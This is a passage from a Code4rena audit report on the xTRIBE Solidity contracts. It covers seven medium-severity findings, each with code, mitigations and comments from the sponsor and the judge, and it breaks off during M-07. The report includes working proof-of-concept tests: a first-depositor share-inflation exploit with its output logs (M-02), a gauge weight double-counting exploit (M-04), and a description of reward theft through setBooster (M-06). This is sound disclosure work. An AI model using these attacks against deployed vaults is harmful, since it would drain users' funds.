---
sponsor: "Tribe"
slug: "2022-04-xtribe"
date: "2022-07-14"
title: "xTRIBE contest"
findings: "https://github.com/code-423n4/2022-04-xtribe-findings/issues"
contest: 111
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the xTRIBE smart contract system written in Solidity. The audit contest took place between April 21—April 27 2022.

## Wardens

47 Wardens contributed reports to the xTRIBE contest:

  1. IllIllI
  1. [gzeon](https://twitter.com/gzeon)
  1. VAD37
  1. [WatchPug](https://twitter.com/WatchPug_) ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))
  1. [smiling_heretic](https://github.com/SmilingHeretic)
  1. hyh
  1. [rayn](https://twitter.com/rayn731)
  1. 0x52
  1. cccz
  1. [joestakey](https://twitter.com/JoeStakey)
  1. 0xkatana
  1. [Dravee](https://twitter.com/JustDravee)
  1. robee
  1. delfin454000
  1. sorrynotsorry
  1. [defsec](https://twitter.com/defsec_)
  1. [catchup](https://twitter.com/catchup22)
  1. [teryanarmen](https://twitter.com/teryanarmenn)
  1. oyc_109
  1. [CertoraInc](https://twitter.com/CertoraInc) (egjlmn1, [OriDabush](https://twitter.com/ori_dabush), ItayG, and shakedwinder)
  1. [MaratCerby](https://twitter.com/MaratCerby)
  1. [0v3rf10w](https://twitter.com/_0v3rf10w)
  1. 0xmint
  1. fatima_naz
  1. [csanuragjain](https://twitter.com/csanuragjain)
  1. samruna
  1. kebabsec (okkothejawa and [FlameHorizon](https://twitter.com/FlameHorizon1))
  1. [Ruhum](https://twitter.com/0xruhum)
  1. hake
  1. 0xDjango
  1. simon135
  1. dipp
  1. [Tomio](https://twitter.com/meidhiwirara)
  1. [Scocco](https://bypassec.com)
  1. [0xNazgul](https://twitter.com/0xNazgul)
  1. saian
  1. joshie
  1. nahnah
  1. [z3s](https://github.com/z3s/)
  1. [Funen](https://instagram.com/vanensurya)
  1. NoamYakov
  1. djxploit
  1. 0x1f8b
  1. [Fitraldys](https://twitter.com/fitraldys)
  1. rotcivegaf

This contest was judged by [0xean](https://github.com/0xean).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 7 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 33 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 xTRIBE contest repository](https://github.com/code-423n4/2022-04-xtribe), and is composed of 6 smart contracts written in the Solidity programming language and includes 1,770 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).

Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).

# Medium Risk Findings (7)
## [[M-01] `xERC4626.sol` Some users may not be able to withdraw until `rewardsCycleEnd` the due to underflow in `beforeWithdraw()`](https://github.com/code-423n4/2022-04-xtribe-findings/issues/48)
_Submitted by WatchPug_

[xERC4626.sol#L65-L68](https://github.com/fei-protocol/ERC4626/blob/2b2baba0fc480326a89251716f52d2cfa8b09230/src/xERC4626.sol#L65-L68)<br>

```solidity
function beforeWithdraw(uint256 amount, uint256 shares) internal virtual override {
    super.beforeWithdraw(amount, shares);
    storedTotalAssets -= amount;
}
```

[xERC4626.sol#L78-L87](https://github.com/fei-protocol/ERC4626/blob/2b2baba0fc480326a89251716f52d2cfa8b09230/src/xERC4626.sol#L78-L87)<br>

```solidity
function syncRewards() public virtual {
    uint192 lastRewardAmount_ = lastRewardAmount;
    uint32 timestamp = block.timestamp.safeCastTo32();

    if (timestamp < rewardsCycleEnd) revert SyncError();

    uint256 storedTotalAssets_ = storedTotalAssets;
    uint256 nextRewards = asset.balanceOf(address(this)) - storedTotalAssets_ - lastRewardAmount_;

    storedTotalAssets = storedTotalAssets_ + lastRewardAmount_; // SSTORE
    ...
```

`storedTotalAssets` is a cached value of total assets which will only include the `unlockedRewards` when the whole cycle ends.

This makes it possible for `storedTotalAssets -= amount` to revert when the withdrawal amount exceeds `storedTotalAssets`, as the withdrawal amount may include part of the `unlockedRewards` in the current cycle.

### Proof of Concept

Given:

*   rewardsCycleLength = 100 days

1.  Alice `deposit()` 100 TRIBE tokens;
2.  The owner transferred 100 TRIBE tokens as rewards and called `syncRewards()`;
3.  1 day later, Alice `redeem()` with all shares, the transaction will revert at `xERC4626.beforeWithdraw()`.

Alice's shares worth 101 TRIBE at this moment, but `storedTotalAssets` = 100, making `storedTotalAssets -= amount` reverts due to underflow.

4.  Bob `deposit()` 1 TRIBE tokens;
5.  Alice `withdraw()` 101 TRIBE tokens, `storedTotalAssets` becomes `0`;
6.  Bob can't even withdraw 1 wei of TRIBE token, as `storedTotalAssets` is now `0`.

If there are no new deposits, both Alice and Bob won't be able to withdraw any of their funds until `rewardsCycleEnd`.

### Recommended Mitigation Steps

Consider changing to:

```solidity
function beforeWithdraw(uint256 amount, uint256 shares) internal virtual override {
    super.beforeWithdraw(amount, shares);
    uint256 _storedTotalAssets = storedTotalAssets;
    if (amount >= _storedTotalAssets) {
        uint256 _totalAssets = totalAssets();
        // _totalAssets - _storedTotalAssets == unlockedRewards
        lastRewardAmount -= _totalAssets - _storedTotalAssets;
        lastSync = block.timestamp;
        storedTotalAssets = _totalAssets - amount;
    } else {
        storedTotalAssets = _storedTotalAssets - amount;
    }
}
```

**[Joeysantoro (xTRIBE) confirmed, but disagreed with High severity, and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/48#issuecomment-1125544449):**
 > This is a valid issue, although the risk is probably medium as the affected user could simply wait until the end of the cycle, and this would only occur in an extreme complete withdrawal of the contract.
> 
> As a soft mitigation, I would prefer to simply override maxWithdraw to return `storedTotalAssets_`.

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/48#issuecomment-1132031068):**
 > I agree with the sponsor here. Assets are not directly lost. 
> 
> `
> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
> `
> 
> `
> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> `
> 
> So a medium severity seems more appropriate. 



***

## [[M-02] First xERC4626 deposit exploit can break share calculation](https://github.com/code-423n4/2022-04-xtribe-findings/issues/66)
_Submitted by VAD37_

Solmate `convertToShares` [function](https://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L133) follow the formula: `assetDepositAmount * totalShareSupply / assetBalanceBeforeDeposit`.

The share price always return 1:1 with asset token. If everything work normally, share price will slowly increase with time to 1:2 or 1:10 as more rewards coming in.

But right after xERC4626 contract creation, during first cycle, any user can deposit 1 share set `totalSupply = 1`. And transfer token to vault to inflate `totalAssets()` before rewards kick in. (Basically, pretend rewards themselves before anyone can deposit in to get much better share price.)

This can inflate base share price as high as 1:1e18 early on, which force all subsequence deposit to use this share price as base.

### Impact

New xERC4626 vault share price can be manipulated right after creation.
Which give early depositor greater share portion of the vault during the first cycle.

While deposit token also affected by rounding precision (due to exploit above) that always return lesser amount of share for user.

### Proof of Concept

Add these code to `xERC4626Test.t.sol` file to test.

```js

    function testExploitNormalCase() public {
        token.mint(address(this), 1e24); // funding
        token.approve(address(xToken), type(uint256).max);
        xToken.syncRewards();
        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 1e18  ", xToken.deposit(1e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_string("fast forward 1 hour to new rewards cycle");
        hevm.warp(3601); // new cycle
        emit log_named_uint("deposit 2e18  ", xToken.deposit(2e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        // Share price stay the same 1:1. Due to no rewards have been given.
    }

    function testExploitShare() public {
        token.mint(address(this), 1e24); // funding
        token.approve(address(xToken), type(uint256).max);

        // init total supply as 1:1 share with token as one.
        xToken.deposit(1, address(this));

        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_string("transfer 100e18 fake token rewards to inflate share price");
        // transfer fake rewards token to xToken contract to inflate totalAsset()
        token.transfer(address(xToken), 100e18);
        xToken.syncRewards();
        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value

        // totalSupply() still 1. So current share price is ~ 1e18 token instead of 1:1 for token.
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 1e18  ", xToken.deposit(1e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        // After new cycle come around. No rewards have been given.
        // But TotalAsset() have been updated to include fake rewards transfer above.
        // this push share price even higher than it should be.
        emit log_string("fast forward 1 hour to new rewards cycle");
        hevm.warp(3601); // new cycle
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 2e18  ", xToken.deposit(2e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 500e18", xToken.deposit(500e18, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        // xToken.syncRewards();
        // hevm.warp(7202); // new cycle
        // Test rounding up value of share
        emit log_named_uint("deposit 1.3e17", xToken.deposit(1.3e17, address(this)));
        emit log_named_uint("deposit 1.9e17", xToken.deposit(1.9e17, address(this)));
        emit log_named_uint("deposit 2e17  ", xToken.deposit(2e17, address(this)));
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
        emit log_named_uint("deposit 2.5e17", xToken.deposit(2.5e17, address(this)));
        // token too small will be reverted.
        hevm.expectRevert(abi.encodePacked("ZERO_SHARES"));
        xToken.deposit(1e17, address(this));
        emit log_string("deposit token less than share price amount will be reverted with zero share error");

        emit log_string("fast forward 1 hour to new rewards cycle");
        xToken.syncRewards();
        hevm.warp(7610); // new cycle
        emit log_named_uint("share price   ", xToken.convertToAssets(1));

        emit log_string("fast forward 1 hour to new rewards cycle");
        xToken.syncRewards();
        hevm.warp(7610+3601); // new cycle
        emit log_named_uint("share price   ", xToken.convertToAssets(1));
    }
```

Log Result:

```js
Running 2 tests for src\test\xERC4626.t.sol:xERC4626Test
[PASS] testExploitNormalCase() (gas: 286966)
Logs:
  share price   : 1
  deposit 1e18  : 1000000000000000000
  share price   : 1
  deposit 500e18: 500000000000000000000
  share price   : 1
  deposit 500e18: 500000000000000000000
  share price   : 1
  fast forward 1 hour to new rewards cycle
  deposit 2e18  : 2000000000000000000
  share price   : 1
  deposit 500e18: 500000000000000000000
  share price   : 1

[PASS] testExploitShare() (gas: 410737)
Logs:
  share price   : 1
  transfer 100e18 fake token rewards to inflate share price
  share price   : 100000000000000001
  deposit 1e18  : 9
  share price   : 110000000000000000
  deposit 500e18: 4545
  share price   : 110010976948408342
  deposit 500e18: 4545
  share price   : 110010989010989010
  fast forward 1 hour to new rewards cycle
  share price   : 120989010989010989
  deposit 2e18  : 16
  share price   : 120996050899517332
  deposit 500e18: 4132
  share price   : 120999396135265700
  deposit 1.3e17: 1
  deposit 1.9e17: 1
  deposit 2e17  : 1
  share price   : 121011244434382310
  deposit 2.5e17: 2
  deposit token less than share price amount will be reverted due to return 0 share
  fast forward 1 hour to new rewards cycle
  share price   : 121011846374405794
  fast forward 1 hour to new rewards cycle
  share price   : 121011846374405794

Test result: ok. 2 passed; 0 failed; finished in 20.78ms
```

### Recommended Mitigation Steps

This exploit is unique to contract similar to ERC4626. It only works if starting supply equal 0 or very small number and rewards cycle is very short. Or everyone withdraws, total share supply become 0.

This can be easily fix by making sure someone always deposited first so `totalSupply` become high enough that this exploit become irrelevant. Unless in unlikely case someone made arbitrage bot watching vault factory contract.<br>
Just force deposit early token during vault construction as last resort.

**[Joeysantoro (xTRIBE) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1126303570):**
 > https://github.com/Rari-Capital/solmate/pull/174/files this is a known issue with 4626. xTRIBE would be initialized safely in this case.

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1132027880):**
 > Known or unknown this is still a valid attack that isn't mitigated for in the current codebase.  Given that there are mitigations that could be integrated on chain (like in the uniswap contracts that burn the first dust amount of LP tokens) , and the warden did demonstrate the attack I am going to downgrade this to medium severity as a "leak of value".
> 
> `
> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> `



***

## [[M-03] `ERC20Gauges`: The `_incrementGaugeWeight` function does not check the gauge parameter enough, so the user may lose rewards](https://github.com/code-423n4/2022-04-xtribe-findings/issues/5)
_Submitted by cccz, also found by 0x52_

The \_incrementGaugeWeight function is used to increase the user's weight on the gauge. However, in the \_incrementGaugeWeight function, it is only checked that the gauge parameter is not in \_deprecatedGauges, but not checked that the gauge parameter is in \_gauges. If the user accidentally uses the wrong gauge parameter, the function will be executed smoothly without any warning, which will cause user loss reward.

        function _incrementGaugeWeight(
            address user,
            address gauge,
            uint112 weight,
            uint32 cycle
        ) internal {
            if (_deprecatedGauges.contains(gauge)) revert InvalidGaugeError();
            unchecked {
                if (cycle - block.timestamp <= incrementFreezeWindow) revert IncrementFreezeError();
            }

            bool added = _userGauges[user].add(gauge); // idempotent add
            if (added && _userGauges[user].length() > maxGauges && !canContractExceedMaxGauges[user])
                revert MaxGaugeError();

            getUserGaugeWeight[user][gauge] += weight;

            _writeGaugeWeight(_getGaugeWeight[gauge], _add, weight, cycle);

            emit IncrementGaugeWeight(user, gauge, weight, cycle);
        }
        ...
        function _writeGaugeWeight(
            Weight storage weight,
            function(uint112, uint112) view returns (uint112) op,
            uint112 delta,
            uint32 cycle
        ) private {
            uint112 currentWeight = weight.currentWeight; // @audit  currentWeight = 0
            // If the last cycle of the weight is before the current cycle, use the current weight as the stored.
            uint112 stored = weight.currentCycle < cycle ? currentWeight : weight.storedWeight; // @audit  stored = 0 < cycle ? 0 : 0
            uint112 newWeight = op(currentWeight, delta); // @audit newWeight = 0 + delta

            weight.storedWeight = stored;
            weight.currentWeight = newWeight;
            weight.currentCycle = cycle;
        }

### Proof of Concept

[ERC20Gauges.sol#L257](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257)<br>

### Recommended Mitigation Steps

        function _incrementGaugeWeight(
            address user,
            address gauge,
            uint112 weight,
            uint32 cycle
        ) internal {
    -       if (_deprecatedGauges.contains(gauge)) revert InvalidGaugeError();
    +       if (_deprecatedGauges.contains(gauge) || !_gauges.contains(gauge)) revert InvalidGaugeError();
            unchecked {
                if (cycle - block.timestamp <= incrementFreezeWindow) revert IncrementFreezeError();
            }

            bool added = _userGauges[user].add(gauge); // idempotent add
            if (added && _userGauges[user].length() > maxGauges && !canContractExceedMaxGauges[user])
                revert MaxGaugeError();

            getUserGaugeWeight[user][gauge] += weight;

            _writeGaugeWeight(_getGaugeWeight[gauge], _add, weight, cycle);

     }

**[Joeysantoro (xTRIBE) disagreed with High severity and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/5#issuecomment-1109219762):**
 > This is absolutely a valid logic bug. I disagree with the severity, as it would be user error to increment a gauge which was incapable of receiving any weight. Should be medium.

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/5#issuecomment-1130311075):**
 > This is a tough one to call between medium and high severity. Assets can directly be lost, but putting the wrong address into ANY function call in general is an easy way for a user to lose funds and isn't unique to this protocol.  I am going to side with the sponsor and downgrade to medium severity. 



***

## [[M-04] In `ERC20Gauges`, contribution to total weight is double-counted when `incrementGauge` is called before `addGauge` for a given gauge.](https://github.com/code-423n4/2022-04-xtribe-findings/issues/22)
_Submitted by smiling_heretic_

[ERC20Gauges.sol#L214](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L214)<br>
[ERC20Gauges.sol#L257](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257)<br>
[ERC20Gauges.sol#L248](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L248)<br>
[ERC20Gauges.sol#L465-L469](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L465-L469)<br>

The impact depends really on how gauges are used by other contracts.

The most obvious consequence I can imagine is that some other contract distributes rewards based on `calculateGaugeAllocation`. However, because `_getStoredWeight(_totalWeight, currentCycle)`  is now larger than the real total sum of weights, all rewards are smaller than they should be (because of larger denominator `total`).

There can be also (potentially large) leftover amount of rewards that is never distributed because now sum of  `calculateGaugeAllocation(gauge, quantity)` over all gauges with constant `quantity` is less than `quantity`. So value might be lost.

### Proof of Concept

I added this test (modified `testCalculateGaugeAllocation` ) to `ERC20GaugesTest.t.sol` and it passes.

        function testExploit() public {
            token.mint(address(this), 100e18);

            token.setMaxGauges(2);
            token.addGauge(gauge1);

            require(token.incrementGauge(gauge1, 1e18) == 1e18);
            require(token.incrementGauge(gauge2, 1e18) == 2e18);
            
            // gauge added after incrementing...
            token.addGauge(gauge2);

            hevm.warp(3600); // warp 1 hour to store changes
            require(token.calculateGaugeAllocation(gauge1, 150e18) == 50e18);
            require(token.calculateGaugeAllocation(gauge2, 150e18) == 50e18);

            // expected value would be 2e18
            require(token.totalWeight() == 3e18);

            require(token.incrementGauge(gauge2, 2e18) == 4e18);

            // ensure updates don't propagate until stored
            require(token.calculateGaugeAllocation(gauge1, 150e18) == 50e18);
            require(token.calculateGaugeAllocation(gauge2, 150e18) == 50e18);

            hevm.warp(7200); // warp another hour to store changes again
            require(token.calculateGaugeAllocation(gauge1, 125e18) == 25e18);
            require(token.calculateGaugeAllocation(gauge2, 125e18) == 75e18);
            
            // expected value would be 4e18
            require(token.totalWeight() == 5e18);
        }

As we  can see, we can call `token.incrementGauge(gauge2, 1e18)` before `token.addGauge(gauge2)`. This is because [this check](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257) doesn't revert for gauges that were never added in the first place.

First time the total weight is incremented in `_incrementUserAndGlobalWeights` and 2nd time [here](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L465-L469).

If corrupting state like this is adventurous for someone, he can frontrun `token.addGauge` called by the admin with a call to `incrementGauge` which is permissionless.

### Tools Used

Foundry

### Recommended Mitigation Steps

Use condition `_gauges.contains(gauge) && !_deprecatedGauges.contains(gauge)`  to check if a gauge can be incremented instead of just ` !_deprecatedGauges.contains(gauge)  `. There's a function `isGauge`  in the contract that does exactly this.

**[Joeysantoro (xTRIBE) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1110487797):**
 > Duplicate of [M-03](https://github.com/code-423n4/2022-04-xtribe-findings/issues/5).

**[0xean (judge) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1132291576):**
 > I think this is different enough from M-03 to warrant its own issue and stand alone. Happy to discuss further with sponsor if they are adamant it's a duplicate. 

**[thomas-waite (xTRIBE) confirmed and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1184672109):**
 > This is caused by and is a unique symptom of the same underlying issue as M-03.



***

## [[M-05] `FlywheelCore`'s `setFlywheelRewards` can remove access to reward funds from current users](https://github.com/code-423n4/2022-04-xtribe-findings/issues/40)
_Submitted by hyh, also found by rayn_

FlywheelCore.setFlywheelRewards can remove current reward funds from the current users' reach as it doesn't check that newFlywheelRewards' FlywheelCore is this contract.

If it's not, by mistake or with a malicious intent, the users will lose the access to reward funds as this FlywheelCore will not be approved for any fund access to the new flywheelRewards, while all the reward funds be moved there.

Setting severity to medium as on one hand that's system breaking issue (no rewards can be claimed after that, users are rugged reward-wise), on the other hand setFlywheelRewards function is requiresAuth. Also, a room for operational mistake isn't too small here as new flywheelRewards contract can be correctly configured and not malicious in all other regards.

### Proof of Concept

FlywheelCore.setFlywheelRewards doesn't check that newFlywheelRewards' FlywheelCore is this FlywheelCore instance:

[FlywheelCore.sol#L164-L171](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L164-L171)<br>

FlywheelCore is immutable within flywheelRewards and its access to the flywheelRewards' funds is set on construction:

[BaseFlywheelRewards.sol#L30](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/BaseFlywheelRewards.sol#L30)<br>

This way if new flywheelRewards contract have any different FlywheelCore then current users' access to reward funds will be irrevocably lost as both claiming functionality and next run of setFlywheelRewards will revert, not being able to transfer any funds from flywheelRewards with `rewardToken.safeTransferFrom(address(flywheelRewards), ...)`:

[FlywheelCore.sol#L125](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L125)<br>

[FlywheelCore.sol#L168](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L168)<br>

As FlywheelCore holds user funds accounting via rewardsAccrued mapping, all these accounts became non-operational, as all the unclaimed rewards will be lost for the users.

### Recommended Mitigation Steps

Consider adding the require for `address(newFlywheelRewards.flywheel) == address(flywheelRewards.flywheel)` in setFlywheelRewards so that users always retain funds access.

**[Joeysantoro (xTRIBE) acknowledged and commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/40#issuecomment-1110497641):**
 > Similar to [M-06](https://github.com/code-423n4/2022-04-xtribe-findings/issues/23). I think adding this check makes sense.

**[0xean (judge) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/40#issuecomment-1130776435):**
 > This issue seems distinct enough from M-06 to warrant separate issues. Leaving open and not as a duplicate. 



***

## [[M-06] `FlywheelCore.setBooster()` can be used to steal unclaimed rewards](https://github.com/code-423n4/2022-04-xtribe-findings/issues/23)
_Submitted by IllIllI_

A malicious authorized user can steal all unclaimed rewards and break the reward accounting

Even if the authorized user is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960). Furthermore since this contract is meant to be used by other projects, the trustworthiness of every project cannot be vouched for.

### Proof of Concept

By setting a booster that returns zero for all calls to `boostedBalanceOf()` where the `user` address is not under the attacker's control, and returning arbitrary values for those under his/her control, an attacker can choose specific amounts of `rewardToken` to assign to himself/herself. The attacker can then call `claimRewards()` to withdraw the funds. Any amounts that the attacker assigns to himself/herself over the amount that normally would have been assigned, upon claiming, is taken from other users' unclaimed balances, since tokens are custodied by the `flywheelRewards` address rather than per-user accounts.

```solidity
File: flywheel-v2/src/FlywheelCore.sol

182       /// @notice swap out the flywheel booster contract
183       function setBooster(IFlywheelBooster newBooster) external requiresAuth {
184           flywheelBooster = newBooster;
185   
186           emit FlywheelBoosterUpdate(address(newBooster));
187       }
```

[FlywheelCore.sol#L182-L187](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L182-L187)<br>

```solidity
File: flywheel-v2/src/FlywheelCore.sol

258           uint256 supplierTokens = address(flywheelBooster) != address(0)
259               ? flywheelBooster.boostedBalanceOf(strategy, user)
260               : strategy.balanceOf(user);
261   
262           // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on unclaimed
263           uint256 supplierDelta = (supplierTokens * deltaIndex) / ONE;
264           uint256 supplierAccrued = rewardsAccrued[user] + supplierDelta;
265   
266           rewardsAccrued[user] = supplierAccrued;
```

[FlywheelCore.sol#L258-L266](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L258-L266)<br>

```solidity
File: flywheel-v2/src/FlywheelCore.sol

119       function claimRewards(address user) external {
120           uint256 accrued = rewardsAccrued[user];
121   
122           if (accrued != 0) {
123               rewardsAccrued[user] = 0;
124   
125               rewardToken.safeTransferFrom(address(flywheelRewards), user, accrued);
```

[FlywheelCore.sol#L119-L125](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L119-L125)<br>

Projects also using `BaseFlywheelRewards` or its child contrats, are implicitly approving infinite transfers by the core

```solidity
File: flywheel-v2/src/rewards/BaseFlywheelRewards.sol

25        constructor(FlywheelCore _flywheel) {
26            flywheel = _flywheel;
27            ERC20 _rewardToken = _flywheel.rewardToken();
28            rewardToken = _rewardToken;
29    
30            _rewardToken.safeApprove(address(_flywheel), type(uint256).max);
31        }
```

[BaseFlywheelRewards.sol#L25-L31](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/BaseFlywheelRewards.sol#L25-L31)<br>

The attacker need not keep the booster set this way - he/she can set it, call `accrue()` for his/her specific user, and unset it, all in the same block.

### Recommended Mitigation Steps

Make `flywheelRewards` immutable, or only allow it to change if there are no current users.

**[Joeysantoro (xTRIBE) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/23#issuecomment-1110489785):**
 > This is a similar issue to one which already affects the SushiSwap masterchef. If rewards are decreased without first calling the `accrue`-equivalent on the masterchef, then previous rewards are lost.
> 
> If trust minimization is a desired property (in my opinion it is), then these functions should be behind timelocks.
> 
> If a user can call accrue before the booster is updated, they can lock in past rewards as they are added onto the rewardsAccrued global state var
> `266           rewardsAccrued[user] = supplierAccrued;`
>
 > I don't really see this as a vulnerability, but will leave it to the C4 judge.

**[0xean (judge) commented](https://github.com/code-423n4/2022-04-xtribe-findings/issues/23#issuecomment-1130780752):**
 > I do see this as a vulnerability. Essentially, there is a backdoor by which a privileged address can extract value from users.  A timelock would be a potential solution to mitigate some of the risk, as well as the mitigation options presented by the warden. 
> 
> `
> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> `
> 
> This is a hypothetical attack path with external requirements and deserves the medium severity rating. 



***

## [[M-07] Incorrect accounting of free weight in `_decrementWeightUntilFree`](https://github.com/code-423n4/2022-04-xtribe-findings/issues/61)
_Submitted by gzeon_

In `_decrementWeightUntilFree`, the free weight is calculated by `balanceOf[user] - getUserWeight[user]` plus weight freed from non-deprecated gauges. The non-deprecated criteria is unnecessary and lead to incorrect accounting of free weight.

### Proof of Concept

[ERC20Gauges.sol#L547-L583](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L547-L583)<br>

        function _decrementWeightUntilFree(address user, uint256 weight) internal {
            uint256 userFreeWeight = balanceOf[user] - getUserWeight[user];

            // early return if already free
            if (userFreeWeight >= weight) return;

            uint32 currentCycle = _getGaugeCycleEnd();

            // cache totals for batch updates
            uint112 userFreed;
            uint112 totalFreed;

            // Loop through all user gauges, live and deprecated
            address[] memory gaugeList = _userGauges[user].values();

            // Free gauges until through entire list or under weight
            uint256 size = gaugeList.length;
            for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight; ) {
                address gauge = gaugeList[i];
                uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];
                if (userGaugeWeight != 0) {
                    // If the gauge is live (not deprecated), include its weight in the total to remove
                    if (!_deprecatedGauges.contains(gauge)) {
                        totalFreed += userGaugeWeight;
                    }
                    userFreed += userGaugeWeight;
                    _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);

                    unchecked {
                        i++;
                    }
                }
            }

            getUserWeight[user] -= userFreed;
            _writeGaugeWeight(_totalWeight, _subtract, totalFreed, currentCycle);
        }

Consider Alice allocated 3 weight to gauge D, gauge A and gauge B equally where gauge D is depricated

1.  Alice call \_decrementWeightUntilFree(alice, 2)
2.  userFreeWeight = 0
3.  gauge D is freed, totalFreed = 0, userFreed = 1
4.  (userFreeWeight + totalFreed) < weight, continue to free next gauge
5.  gauge A is freed, totalFreed = 1, userFreed = 2
6.  (userFreeWeight + totalFreed) < weight, continue to free next gauge
7.  gauge B is freed, totalFreed = 2, userFreed = 3
8.  All gauge is freed

Alternatively, Alice can

1.  Alice call \_decrementWeightUntilFree(alice, 1)
